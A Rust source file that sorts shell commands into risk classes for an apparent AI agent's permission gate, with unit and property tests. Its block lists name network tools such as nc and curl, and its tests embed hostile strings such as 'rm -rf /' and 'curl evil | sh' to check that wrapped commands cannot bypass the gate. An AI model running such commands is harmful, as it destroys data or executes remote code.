//! Command risk classification.
//!
//! `run_shell` executes an argument list directly (no shell interpretation), so
//! classification looks at the program and its arguments, not a shell string.
//! The per-OS classifiers are pure functions tested on every platform; the
//! active-OS [`classify`] dispatches to the right one.

/// The risk class of a command, driving the permission decision.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum CommandClass {
    ReadOnly,
    ProjectWrite,
    ExternalWrite,
    Network,
    Destructive,
    Privileged,
    Unknown,
}

/// Classify a command for the current platform.
#[must_use]
pub fn classify(program: &str, args: &[String]) -> CommandClass {
    #[cfg(windows)]
    {
        classify_windows(program, args)
    }
    #[cfg(not(windows))]
    {
        classify_posix(program, args)
    }
}

fn program_stem(program: &str) -> String {
    let path = std::path::Path::new(program);
    path.file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or(program)
        .to_ascii_lowercase()
}

fn args_lower(args: &[String]) -> Vec<String> {
    args.iter().map(|a| a.to_ascii_lowercase()).collect()
}

fn any_arg(args: &[String], needles: &[&str]) -> bool {
    args.iter().any(|a| needles.contains(&a.as_str()))
}

/// Shell wrappers, command prefixes, and interpreters that execute an embedded
/// command or script this classifier cannot see into. They never classify
/// below `Unknown` — auto-allowing them would be a clean classification bypass
/// (`bash -c "rm -rf /"`, `env rm -rf /`, `python -c "shutil.rmtree(...)"`).
fn is_opaque_wrapper(stem: &str, args: &[String]) -> bool {
    if matches!(
        stem,
        "bash"
            | "sh"
            | "zsh"
            | "dash"
            | "ksh"
            | "fish"
            | "env"
            | "nohup"
            | "xargs"
            | "nice"
            | "ionice"
            | "stdbuf"
            | "timeout"
            | "time"
            | "wsl"
    ) {
        return true;
    }
    // An interpreter given inline code is opaque; a plain script path is
    // equally opaque to this classifier and already lands at Unknown.
    matches!(
        stem,
        "python" | "python3" | "node" | "deno" | "bun" | "perl" | "ruby" | "php"
    ) && any_arg(args, &["-c", "-e", "--eval", "-eval"])
}

/// POSIX (Linux/macOS) command classification.
#[must_use]
pub fn classify_posix(program: &str, args: &[String]) -> CommandClass {
    let stem = program_stem(program);
    let args = args_lower(args);

    if matches!(stem.as_str(), "sudo" | "doas" | "su" | "pkexec") {
        return CommandClass::Privileged;
    }
    if is_opaque_wrapper(&stem, &args) {
        return CommandClass::Unknown;
    }
    match stem.as_str() {
        "rm" if any_arg(&args, &["-r", "-rf", "-fr", "-f", "--recursive", "--force"]) => {
            return CommandClass::Destructive
        }
        "rm" | "rmdir" | "shred" | "dd" | "mkfs" | "fdisk" | "parted" | "wipefs" | "truncate" => {
            return CommandClass::Destructive
        }
        _ => {}
    }
    if is_network_program(&stem) || is_network_package_op(&stem, &args) {
        return CommandClass::Network;
    }
    if stem == "git" {
        return classify_git(&args);
    }
    if is_read_only_program(&stem) || (stem == "sed" && !any_arg(&args, &["-i", "--in-place"])) {
        return CommandClass::ReadOnly;
    }
    if is_project_write_program(&stem) || (stem == "sed" && any_arg(&args, &["-i", "--in-place"])) {
        return CommandClass::ProjectWrite;
    }
    CommandClass::Unknown
}

/// Windows command classification: PowerShell, `cmd.exe`, and direct executables
/// are classified separately.
#[must_use]
pub fn classify_windows(program: &str, args: &[String]) -> CommandClass {
    let stem = program_stem(program);
    let args = args_lower(args);

    if matches!(stem.as_str(), "runas") {
        return CommandClass::Privileged;
    }
    if matches!(stem.as_str(), "reg" | "regedit") {
        return CommandClass::Privileged;
    }
    // `powershell`/`pwsh`/`cmd` carrying an inline command or script are opaque:
    // the embedded command is invisible to substring classification, exactly like
    // `bash -c`. Auto-allowing them would be a clean classification bypass —
    // `cmd /c "echo data > file"` is a write, not the read its `echo` looks like.
    if matches!(stem.as_str(), "powershell" | "pwsh" | "cmd") {
        if carries_inline_command(&stem, &args) {
            return CommandClass::Unknown;
        }
        let class = if stem == "cmd" {
            classify_cmd(&args)
        } else {
            classify_powershell(&args)
        };
        // A redirection turns a read-looking command into a write; never let the
        // substring classifier hand one back as auto-allowable `ReadOnly`.
        return redirection_floor(class, &args);
    }
    // POSIX-style shells and wrapper programs reachable on Windows (git-bash,
    // WSL, MSYS) are just as opaque here.
    if is_opaque_wrapper(&stem, &args) {
        return CommandClass::Unknown;
    }
    match stem.as_str() {
        "del" | "erase" | "rd" | "rmdir" | "format" | "diskpart" => {
            return CommandClass::Destructive
        }
        "copy" | "move" | "md" | "mkdir" | "xcopy" | "robocopy" => {
            return CommandClass::ProjectWrite
        }
        "type" | "dir" | "where" | "findstr" | "more" => return CommandClass::ReadOnly,
        _ => {}
    }
    // Direct executables share the cross-platform program rules.
    if is_network_program(&stem) || is_network_package_op(&stem, &args) {
        return CommandClass::Network;
    }
    if stem == "git" {
        return classify_git(&args);
    }
    if is_read_only_program(&stem) {
        return CommandClass::ReadOnly;
    }
    if is_project_write_program(&stem) {
        return CommandClass::ProjectWrite;
    }
    CommandClass::Unknown
}

/// Whether a `cmd`/`powershell`/`pwsh` invocation carries an inline command or
/// script — `cmd /c "…"`, `powershell -Command "…"`, `-EncodedCommand`, or a
/// `-File` script. Such an invocation is opaque to substring classification.
/// `args` are already lowercased. PowerShell allows prefix-abbreviated switches
/// (`-Command` → `-c`, `-EncodedCommand` → `-e`), so flags are matched as
/// prefixes, erring toward opacity.
fn carries_inline_command(stem: &str, args: &[String]) -> bool {
    match stem {
        "cmd" => any_arg(args, &["/c", "/k"]),
        "powershell" | "pwsh" => args.iter().any(|a| {
            a == "-c"
                || is_switch_prefix(a, "-command")
                || is_switch_prefix(a, "-encodedcommand")
                || is_switch_prefix(a, "-file")
        }),
        _ => false,
    }
}

/// Whether `arg` is a non-empty `-`-prefixed abbreviation of `full` (PowerShell
/// switch prefix-matching), e.g. `-co`/`-comm`/`-command` all match `-command`.
fn is_switch_prefix(arg: &str, full: &str) -> bool {
    arg.len() >= 2 && arg.starts_with('-') && full.starts_with(arg)
}

/// Raise a `ReadOnly` verdict to `ProjectWrite` when the arguments contain an
/// output redirection (`>`/`>>`), which produces a write the read-looking
/// command name hides. Other classes are returned unchanged.
fn redirection_floor(class: CommandClass, args: &[String]) -> CommandClass {
    if class == CommandClass::ReadOnly && args.iter().any(|a| a.contains('>')) {
        CommandClass::ProjectWrite
    } else {
        class
    }
}

fn classify_powershell(args: &[String]) -> CommandClass {
    let joined = args.join(" ");
    if joined.contains("remove-item") && (joined.contains("-recurse") || joined.contains("-force"))
    {
        return CommandClass::Destructive;
    }
    if joined.contains("remove-item")
        || joined.contains("clear-content")
        || joined.contains("format-volume")
    {
        return CommandClass::Destructive;
    }
    if joined.contains("hklm:")
        || joined.contains("set-itemproperty")
        || joined.contains("new-itemproperty")
    {
        return CommandClass::Privileged;
    }
    if joined.contains("invoke-webrequest")
        || joined.contains("invoke-restmethod")
        || joined.contains("start-bitstransfer")
    {
        return CommandClass::Network;
    }
    if joined.contains("set-content")
        || joined.contains("add-content")
        || joined.contains("out-file")
        || joined.contains("new-item")
    {
        return CommandClass::ProjectWrite;
    }
    if joined.contains("get-")
        || joined.contains("select-")
        || joined.contains("write-output")
        || joined.contains("write-host")
    {
        return CommandClass::ReadOnly;
    }
    CommandClass::Unknown
}

fn classify_cmd(args: &[String]) -> CommandClass {
    let joined = args.join(" ");
    if joined.contains("del ")
        || joined.contains("erase ")
        || joined.contains("rd ")
        || joined.contains("rmdir")
        || joined.contains("format ")
    {
        return CommandClass::Destructive;
    }
    if joined.contains("reg add") || joined.contains("reg delete") {
        return CommandClass::Privileged;
    }
    if joined.contains("copy ")
        || joined.contains("move ")
        || joined.contains("md ")
        || joined.contains("mkdir")
    {
        return CommandClass::ProjectWrite;
    }
    if joined.contains("type ") || joined.contains("dir") || joined.contains("echo") {
        return CommandClass::ReadOnly;
    }
    CommandClass::Unknown
}

fn classify_git(args: &[String]) -> CommandClass {
    let sub_index = args.iter().position(|a| !a.starts_with('-'));
    let sub = sub_index.map(|i| args[i].as_str()).unwrap_or("");
    let rest = sub_index.map(|i| &args[i + 1..]).unwrap_or(&[]);
    match sub {
        "clone" | "pull" | "push" | "fetch" | "remote" | "submodule" => CommandClass::Network,
        "status" | "log" | "diff" | "show" | "branch" | "rev-parse" | "describe" | "blame"
        | "tag" | "ls-files" => CommandClass::ReadOnly,
        // Flag and pathspec forms that discard uncommitted work face the same
        // gate as the purpose-built destructive tool — `run_shell` must never
        // be the weaker path to the same effect.
        "reset" if any_arg(rest, &["--hard", "--merge"]) => CommandClass::Destructive,
        "clean"
            if rest
                .iter()
                .any(|a| a == "--force" || (a.starts_with('-') && a.contains('f'))) =>
        {
            CommandClass::Destructive
        }
        "restore" => CommandClass::Destructive,
        "checkout" if discards_working_tree(rest) => CommandClass::Destructive,
        "add" | "commit" | "checkout" | "switch" | "stash" | "merge" | "rebase" | "reset"
        | "cherry-pick" | "apply" | "mv" | "rm" => CommandClass::ProjectWrite,
        _ => CommandClass::Unknown,
    }
}

/// Whether a `git checkout` argument list targets pathspecs (overwriting
/// working-tree files) rather than a plain branch switch. Conservative: a `--`
/// separator, a `.`/relative pathspec, or multiple non-flag arguments classify
/// as working-tree discard; a misjudged branch switch only costs a prompt.
fn discards_working_tree(rest: &[String]) -> bool {
    if rest
        .iter()
        .any(|a| a == "--" || a == "." || a.starts_with("./"))
    {
        return true;
    }
    rest.iter().filter(|a| !a.starts_with('-')).count() > 1
}

fn is_network_program(stem: &str) -> bool {
    matches!(
        stem,
        "curl"
            | "wget"
            | "ssh"
            | "scp"
            | "sftp"
            | "rsync"
            | "nc"
            | "ncat"
            | "netcat"
            | "telnet"
            | "ping"
            | "ftp"
            | "http"
            | "https"
    )
}

fn is_network_package_op(stem: &str, args: &[String]) -> bool {
    let installs = [
        "install", "add", "update", "upgrade", "publish", "fetch", "remove",
    ];
    match stem {
        "apt" | "apt-get" | "yum" | "dnf" | "pacman" | "brew" | "pip" | "pip3" | "npm" | "pnpm"
        | "yarn" | "gem" | "go" => any_arg(args, &installs),
        "cargo" => any_arg(args, &["install", "add", "publish", "update"]),
        _ => false,
    }
}

fn is_read_only_program(stem: &str) -> bool {
    matches!(
        stem,
        "ls" | "cat"
            | "echo"
            | "pwd"
            | "head"
            | "tail"
            | "wc"
            | "grep"
            | "egrep"
            | "fgrep"
            | "rg"
            | "stat"
            | "file"
            | "which"
            | "type"
            | "basename"
            | "dirname"
            | "true"
            | "date"
            | "printenv"
            | "sort"
            | "uniq"
            | "cut"
            | "tr"
            | "less"
            | "more"
            | "tree"
            | "du"
            | "df"
            | "uname"
            | "whoami"
            | "id"
            | "hostname"
            | "awk"
            | "cmp"
            | "diff"
            | "realpath"
            | "readlink"
    )
}

fn is_project_write_program(stem: &str) -> bool {
    matches!(
        stem,
        "touch"
            | "mkdir"
            | "mv"
            | "cp"
            | "ln"
            | "tee"
            | "install"
            | "make"
            | "cargo"
            | "npm"
            | "pnpm"
            | "yarn"
            | "cmake"
            | "ninja"
            | "rustc"
            | "go"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(args: &[&str]) -> Vec<String> {
        args.iter().map(|s| (*s).to_string()).collect()
    }

    #[test]
    fn posix_detects_destructive_and_privileged() {
        assert_eq!(
            classify_posix("rm", &argv(&["-rf", "build"])),
            CommandClass::Destructive
        );
        assert_eq!(
            classify_posix("/bin/rm", &argv(&["-r", "x"])),
            CommandClass::Destructive
        );
        assert_eq!(
            classify_posix("shred", &argv(&["f"])),
            CommandClass::Destructive
        );
        assert_eq!(
            classify_posix("sudo", &argv(&["ls"])),
            CommandClass::Privileged
        );
        assert_eq!(
            classify_posix("doas", &argv(&["rm"])),
            CommandClass::Privileged
        );
    }

    #[test]
    fn posix_classifies_network_and_reads_and_writes() {
        assert_eq!(
            classify_posix("curl", &argv(&["https://x"])),
            CommandClass::Network
        );
        assert_eq!(
            classify_posix("pip", &argv(&["install", "x"])),
            CommandClass::Network
        );
        assert_eq!(
            classify_posix("git", &argv(&["push"])),
            CommandClass::Network
        );
        assert_eq!(
            classify_posix("ls", &argv(&["-la"])),
            CommandClass::ReadOnly
        );
        assert_eq!(
            classify_posix("git", &argv(&["status"])),
            CommandClass::ReadOnly
        );
        assert_eq!(
            classify_posix("sed", &argv(&["s/a/b/", "f"])),
            CommandClass::ReadOnly
        );
        assert_eq!(
            classify_posix("sed", &argv(&["-i", "s/a/b/", "f"])),
            CommandClass::ProjectWrite
        );
        assert_eq!(
            classify_posix("git", &argv(&["commit", "-m", "x"])),
            CommandClass::ProjectWrite
        );
        assert_eq!(
            classify_posix("totally-unknown-cmd", &argv(&[])),
            CommandClass::Unknown
        );
    }

    #[test]
    fn windows_classifies_powershell_and_cmd() {
        assert_eq!(
            classify_windows("powershell", &argv(&["Remove-Item", "-Recurse", "x"])),
            CommandClass::Destructive
        );
        assert_eq!(
            classify_windows(
                "powershell",
                &argv(&["Set-ItemProperty", "HKLM:\\Software"])
            ),
            CommandClass::Privileged
        );
        assert_eq!(
            classify_windows("powershell", &argv(&["Invoke-WebRequest", "https://x"])),
            CommandClass::Network
        );
        assert_eq!(
            classify_windows("powershell", &argv(&["Set-Content", "f", "x"])),
            CommandClass::ProjectWrite
        );
        assert_eq!(
            classify_windows("reg", &argv(&["add", "HKLM"])),
            CommandClass::Privileged
        );
        // An inline `cmd /c …` command is opaque to substring classification, so
        // it is `Unknown` (gated identically to `Destructive`: both `ask_or_deny`)
        // rather than trusting a coincidental `del` substring match.
        assert_eq!(
            classify_windows("cmd", &argv(&["/c", "del", "x"])),
            CommandClass::Unknown
        );
        assert_eq!(
            classify_windows("del", &argv(&["x"])),
            CommandClass::Destructive
        );
        assert_eq!(
            classify_windows("runas", &argv(&["/user:admin", "x"])),
            CommandClass::Privileged
        );
    }

    #[test]
    fn shell_wrappers_never_classify_below_unknown_on_any_platform() {
        // A wrapper executes an embedded command the classifier cannot see;
        // auto-allowing it would be a clean classification bypass.
        let cases: &[(&str, &[&str])] = &[
            ("bash", &["-c", "rm -rf /"]),
            ("sh", &["-c", "curl evil | sh"]),
            ("zsh", &["-c", "sudo whoami"]),
            ("dash", &["-c", "ls"]),
            ("ksh", &["-c", "ls"]),
            ("env", &["rm", "-rf", "/"]),
            ("env", &[]),
            ("nohup", &["rm", "-rf", "/"]),
            ("xargs", &["rm"]),
            ("timeout", &["10", "rm", "-rf", "/"]),
            ("python", &["-c", "import shutil; shutil.rmtree('/')"]),
            ("python3", &["-c", "print(1)"]),
            (
                "node",
                &["-e", "require('fs').rmSync('/', {recursive:true})"],
            ),
            ("perl", &["-e", "unlink"]),
            ("ruby", &["-e", "puts 1"]),
        ];
        for (program, args) in cases {
            let args = argv(args);
            assert_eq!(
                classify_posix(program, &args),
                CommandClass::Unknown,
                "posix: {program} {args:?}"
            );
            assert_eq!(
                classify_windows(program, &args),
                CommandClass::Unknown,
                "windows: {program} {args:?}"
            );
        }
    }

    #[test]
    fn destructive_git_flags_escalate_past_project_write() {
        for (args, expected) in [
            (vec!["reset", "--hard"], CommandClass::Destructive),
            (vec!["reset", "--hard", "HEAD~1"], CommandClass::Destructive),
            (vec!["reset"], CommandClass::ProjectWrite),
            (
                vec!["reset", "--soft", "HEAD~1"],
                CommandClass::ProjectWrite,
            ),
            (vec!["clean", "-f"], CommandClass::Destructive),
            (vec!["clean", "-fd"], CommandClass::Destructive),
            (vec!["clean", "--force"], CommandClass::Destructive),
            (vec!["restore", "src/main.rs"], CommandClass::Destructive),
            (vec!["restore", "--", "."], CommandClass::Destructive),
            (vec!["checkout", "--", "file.rs"], CommandClass::Destructive),
            (vec!["checkout", "."], CommandClass::Destructive),
            (
                vec!["checkout", "main", "file.rs"],
                CommandClass::Destructive,
            ),
            (vec!["checkout", "main"], CommandClass::ProjectWrite),
            (vec!["switch", "main"], CommandClass::ProjectWrite),
            (vec!["commit", "-m", "x"], CommandClass::ProjectWrite),
        ] {
            let args = argv(&args);
            assert_eq!(
                classify_posix("git", &args),
                expected,
                "posix: git {args:?}"
            );
            assert_eq!(
                classify_windows("git", &args),
                expected,
                "windows: git {args:?}"
            );
        }
    }

    proptest::proptest! {
        // Classification never panics on adversarial input.
        #[test]
        fn classification_is_total(program in ".*", args in proptest::collection::vec(".*", 0..5)) {
            let _ = classify_posix(&program, &args);
            let _ = classify_windows(&program, &args);
        }

        // No wrapper invocation ever classifies as auto-allowable read-only.
        #[test]
        fn wrappers_are_never_read_only(
            wrapper in proptest::sample::select(vec!["bash", "sh", "zsh", "dash", "ksh", "env", "xargs", "nohup", "timeout"]),
            args in proptest::collection::vec(".*", 0..4),
        ) {
            assert!(classify_posix(wrapper, &args) != CommandClass::ReadOnly);
            assert!(classify_windows(wrapper, &args) != CommandClass::ReadOnly);
        }

        // A `cmd`/`powershell` invocation carrying an inline command, or any
        // argument list with a redirection, never classifies as auto-allowable
        // `ReadOnly` — the bypass closed here, pinned across arbitrary args.
        #[test]
        fn windows_inline_or_redirected_shells_are_never_read_only(
            shell in proptest::sample::select(vec!["cmd", "powershell", "pwsh"]),
            args in proptest::collection::vec(".*", 0..4),
        ) {
            let inline_flag = if shell == "cmd" { "/c" } else { "-command" };
            let mut inline = vec![inline_flag.to_string()];
            inline.extend(args.clone());
            assert!(classify_windows(shell, &inline) != CommandClass::ReadOnly);

            let mut redirected = args.clone();
            redirected.push(">".to_string());
            redirected.push("out.txt".to_string());
            assert!(classify_windows(shell, &redirected) != CommandClass::ReadOnly);
        }
    }

    #[test]
    fn windows_inline_shell_commands_are_opaque() {
        // The bypass: `cmd /c "echo … > file"` is a write, not the read its
        // `echo` looks like. An inline command/script is opaque → Unknown
        // (gated), never auto-allowable.
        assert_eq!(
            classify_windows("cmd", &argv(&["/c", "echo data > out.txt"])),
            CommandClass::Unknown
        );
        assert_eq!(
            classify_windows("powershell", &argv(&["-Command", "Get-ChildItem"])),
            CommandClass::Unknown
        );
        assert_eq!(
            classify_windows("powershell", &argv(&["-c", "Remove-Item x"])),
            CommandClass::Unknown
        );
        assert_eq!(
            classify_windows("pwsh", &argv(&["-EncodedCommand", "ZQBjAGgAbwA="])),
            CommandClass::Unknown
        );
        assert_eq!(
            classify_windows("powershell", &argv(&["-File", "deploy.ps1"])),
            CommandClass::Unknown
        );
    }

    #[test]
    fn windows_redirection_bumps_read_only_to_write() {
        // A non-inline read-looking command with a redirection is really a write.
        assert_eq!(
            classify_windows("powershell", &argv(&["Get-Content", "x", ">", "out.txt"])),
            CommandClass::ProjectWrite
        );
        // No redirection: the read classification stands.
        assert_eq!(
            classify_windows("powershell", &argv(&["Get-Content", "x"])),
            CommandClass::ReadOnly
        );
    }
}
